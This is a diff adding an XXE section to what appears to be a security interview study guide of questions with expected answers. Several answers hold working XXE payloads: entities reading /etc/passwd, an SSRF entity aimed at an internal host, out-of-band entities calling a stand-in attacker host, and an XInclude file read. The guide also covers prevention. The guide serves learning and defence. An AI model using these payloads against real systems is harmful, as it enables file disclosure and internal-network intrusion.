@@ -124,6 +124,27 @@
 8. What are some SSRF mitigations?
 
 **XML External Entity (XXE) Injection**:
+1. What is XML external entity injection?
+2. What is XML?
+3. What are XML entities?
+4. What is document type definition? 
+5. What are XML custom entities? 
+6. What are XML external entities?
+7. How do XXE vulnerabilities arise?
+8. What are the types of XXE attacks?
+9. How do you exploit XXE to retrieve files? 
+10. How would you perform an XXE to retrieve files?
+11. How do test systematically for XXE vulnerabilities?
+12. How do you exploit XXE to perform SSRF attacks?
+13. How do you detect blind XXE?
+14. How do you detect blind XXE using out-of-band (OAST) techniques?
+15. How do you exploit blind XXE by repurposing a local DTD?
+16. Where can you find hidden attack surfaces for XXE injection?
+17. What is an XInclude attack?
+18. What is an XXE attacks via file upload?
+19. How to find and test for XXE vulnerabilities?
+20. Can you use XML-based functionality for other vulnerabilities?
+21. How to prevent XXE vulnerabilities?
 
 
 ### Web Security
@@ -619,6 +640,105 @@ Manipulating the transport_url via a query parameter in the website URL. For exa
 
 #### XML External Entity (XXE) Injection
 
+1. What is XML external entity injection?  
+**Expected Answer**: XML external entity injection (XXE) allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.
+
+1. What is XML?  
+**Expected Answer**: XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. 
+
+1. What are XML entities?  
+**Expected Answer**: XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.
+
+1. What is document type definition?  
+**Expected Answer**: The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.
+
+1. What are XML custom entities?  
+**Expected Answer**: XML allows custom entities to be defined within the DTD. For example: `<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`. This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".
+
+1. What are XML external entities?  
+**Expected Answer**: XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared. The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`. The URL can use the file:// protocol, and so external entities can be loaded from file. For example: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`. XML external entities provide the primary means by which XML external entity attacks arise.
+
+1. How do XXE vulnerabilities arise?  
+**Expected Answer**: Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application. XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.
+
+1. What are the types of XXE attacks?  
+**Expected Answer**: 
+
+   * Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.
+   * Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
+   * Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
+   * Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.
+
+1. How do you exploit XXE to retrieve files?  
+**Expected Answer**: To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
+
+   * Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
+   * Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
+
+1. A shopping application checks for the stock level of a product by submitting the following XML to the server: 
+
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <stockCheck><productId>381</productId></stockCheck>
+   ```
+   How would you perform an XXE to retrieve files?
+**Expected Answer**: 
+
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+   <stockCheck><productId>&xxe;</productId></stockCheck>
+   ```
+   This XXE payload defines an external entity `&xxe;` whose value is the contents of the /etc/passwd file and uses the entity within the productId value.
+
+1. How do test systematically for XXE vulnerabilities?  
+**Expected Answer**: Generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.
+
+1. How do you exploit XXE to perform SSRF attacks?  
+**Expected Answer**: Define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences). `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
+
+1. How do you detect blind XXE?  
+**Expected Answer**: 
+
+   * Trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data. 
+   * Trigger XML parsing errors in such a way that the error messages contain sensitive data.
+
+1. How do you detect blind XXE using out-of-band (OAST) techniques?  
+**Expected Answer**: Define an external entity as follows: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`. Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. The declaration of an XML parameter entity includes the percent character before the entity name: `<!ENTITY % myparameterentity "my parameter entity value" >`. Parameter entities are referenced using the percent character instead of the usual ampersand `%myparameterentity;`. This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`.
+
+1. How do you exploit blind XXE by repurposing a local DTD?  
+**Expected Answer**: Due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.
+
+1. Where can you find hidden attack surfaces for XXE injection?  
+**Expected Answer**: 
+
+   * XInclude attacks
+   * XXE attacks via file upload
+   * XXE attacks via modified content type
+
+1. What is an XInclude attack?  
+**Expected Answer**: XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document. To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For example:
+
+   ```xml
+   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+   <xi:include parse="text" href="file:///etc/passwd"/></foo>
+   ```
+
+1. What is an XXE attacks via file upload?  
+**Expected Answer**: Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.
+
+1. How to find and test for XXE vulnerabilities?  
+**Expected Answer**: 
+
+   * Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
+   * Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator is perfect for this purpose.
+   * Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.
+
+1. Can you use XML-based functionality for other vulnerabilities?  
+**Expected Answer**: Yes, since XML is just a data transfer format you can also test any XML-based functionality for other vulnerabilities like XSS and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to obfuscate your attack in order to bypass weak defences.
+
+1. How to prevent XXE vulnerabilities?  
+**Expected Answer**: Virtually all XXE vulnerabilities arise because the application's XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The easiest and most effective way to prevent XXE attacks is to disable those features. Generally, it is sufficient to disable resolution of external entities and disable support for XInclude. This can usually be done via configuration options or by programmatically overriding default behavior. Consult the documentation for your XML parsing library or API for details about how to disable unnecessary capabilities.
 
 
 
